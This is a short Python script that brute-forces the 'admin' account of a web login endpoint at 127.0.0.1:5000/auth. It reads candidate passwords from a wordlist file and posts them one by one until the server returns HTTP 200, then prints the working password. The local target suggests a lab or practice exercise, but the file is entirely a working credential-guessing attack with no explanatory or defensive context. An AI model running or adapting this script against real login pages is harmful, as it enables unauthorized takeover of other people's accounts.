import requests

with open('pp.txt') as pp:
    s = pp.read()
    passwords = s.split('\n')

print(passwords[:10])

index = 0


def get_next_password():
    global index
    tobe_returned = passwords[index]
    index += 1
    return tobe_returned


status_code = 0
step = 0
while status_code != 200:
    password = get_next_password()
    r = requests.post('http://127.0.0.1:5000/auth',
                      data={'login': 'admin', 'password': password})
    status_code = r.status_code
    if step % 100 == 0:
        print(password)
    step += 1

print(password)
